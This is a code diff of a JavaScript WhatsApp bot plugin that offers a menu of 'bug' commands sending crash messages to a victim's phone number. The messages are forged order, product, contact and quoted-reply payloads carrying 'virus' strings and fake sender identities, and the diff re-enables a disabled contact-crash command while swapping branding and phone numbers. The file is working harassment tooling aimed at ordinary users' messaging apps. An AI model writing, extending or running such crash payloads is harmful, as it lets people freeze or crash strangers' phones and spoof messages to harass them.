@@ -14,7 +14,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	//const participants = m.isGroup ? await groupMetadata.participants : ''
 	let q = `Bug Tag From ${author}\n${text}`
 	let sections = [{
-		title: `Recoded by ${packname}`,
+		title: `Recoded by ${gcname}`,
 		rows: [
 			{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
 			{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
@@ -30,7 +30,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	}]
 	let listMessage = {
 		text: '*[ List Bug ]*\n\n*Note :* Jangan Gunakan Secara Sembarangan',
-		footer: packname,
+		footer: gcname,
 		buttonText: 'Silahkan Klik Di Sini',
 		sections
 	}
@@ -40,7 +40,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },
 	"message": {
 		"extendedTextMessage": {
-			"text": `${packname}`,
+			"text": `${gcname}`,
 			"previewType": "NONE",
 			"contextInfo": {
 				"stanzaId": "3EB0382EDBB2",
@@ -59,7 +59,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			"status": "INQUIRY",
 			"surface": "CATALOG",
 			"message": "",
-			"orderTitle": `${packname}`,
+			"orderTitle": `${gcname}`,
 			"sellerJid": "62857887347569@s.whatsapp.net",
 			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 			"totalAmount1000": fsizedoc,
@@ -70,11 +70,11 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"},
 	"message": {
 		orderMessage: { 		itemCount: fsizedoc,
-			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `漏 ${packname}`,
+			status: 200, 		thumbnail: thumb, 		surface: 200, 		message: `漏 ${gcname}`,
 			token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 			totalAmount1000: fsizedoc,
 			totalCurrencyCode: "IDR",
-			orderTitle: `${packname} ${virus2}`,
+			orderTitle: `${gcname} ${virus2}`,
 			sellerJid: '0@s.whatsapp.net'}}, 		contextInfo: { "forwardingScore":999,"isForwarded":true },
 		sendEphemeral: true
 	}	
@@ -87,8 +87,8 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			"itemCount": fsizedoc,
 			"status": "INQUIRY",
 			"surface": "CATALOG",
-			"message": `${packname}`,
-			"orderTitle": `${packname}`,
+			"message": `${gcname}`,
+			"orderTitle": `${gcname}`,
 			"sellerJid": "62857887347569@s.whatsapp.net",
 			"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 			"totalAmount1000": fsizedoc,
@@ -99,7 +99,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 	//# Pdf
 	const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) },
 	message: {
-		"imageMessage": { "mimetype": "image/jpeg", "caption": `${packname}`, "jpegThumbnail": thumb
+		"imageMessage": { "mimetype": "image/jpeg", "caption": `${gcname}`, "jpegThumbnail": thumb
 		}
 	}}
 	//=================================================//   
@@ -118,7 +118,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 				"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
 				"fileLength": fsizedoc,
 				"seconds": fsizedoc,
-				"caption": `${packname}`,
+				"caption": `${gcname}`,
 				"ptt": false,
 				"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
 				"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
@@ -135,24 +135,24 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		"product": {
 			"productImage": messa.imageMessage,
 			"productId": "4383282311765462",
-			"title": `${packname}`,
+			"title": `${gcname}`,
 			"description": `${virus2}`,
 			"currencyCode": "IDR",
 			"bodyText": `${virus}`,
-			"footerText": `${packname}`,
+			"footerText": `${gcname}`,
 			"priceAmount1000": fsizedoc,
 			"productImageCount": 1,
 			"firstImageId": 1,
 			"salePriceAmount1000": fsizedoc,
-			"retailerId": `${packname}`,
-			"url": "wa.me/6283839200413"
+			"retailerId": `${gcname}`,
+			"url": "wa.me/6281265970249"
 		},
-			"businessOwnerJid": "6283839200413@s.whatsapp.net",
+			"businessOwnerJid": "6281265970249@s.whatsapp.net",
 		}
 	}), { userJid: m.chat, quoted: ftrolii })	
 	//=================================================//	
 	//# Contact
-	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${packname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${packname}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
+	const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${gcname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${gcname}\nitem1.TEL;waid=6281265970249:6281265970249\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
 	//=================================================//   
 	//# Text
 	const main = {
@@ -182,7 +182,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		}
 		break
 		case 'sticker': {
-			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
+			let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.gcname, global.author)
 			conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
 			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 		}
@@ -192,8 +192,8 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		}
 		break
 		case 'bugcrash': {
-			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
-			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
+			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '6281265970249@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
+			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '6281265970249@s.whatsapp.net', 'B', '0@broadcast')
 			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
 			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
 			conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
@@ -201,7 +201,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 		}
 		break
-		/*case 'bugkontak': {
+		case 'bugkontak': {
 			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
 				"contactMessage": {
 					"vcard": "HAHaAhHAHAHA",
@@ -215,9 +215,9 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			conn.relayWAMessage(res)
 			//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
 		}
-		break*/
+		break
 		case 'reactpc': {
-			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${packname}` }, {quoted: trol})
+			await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${gcname}` }, {quoted: trol})
 			//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
 		}
 		break
@@ -231,7 +231,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 		}
 		break
 		case 'bugtextcrash': {
-			conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${packname}`, main)
+			conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${gcname}`, main)
 		}
 		break
 		case 'bugvid': {
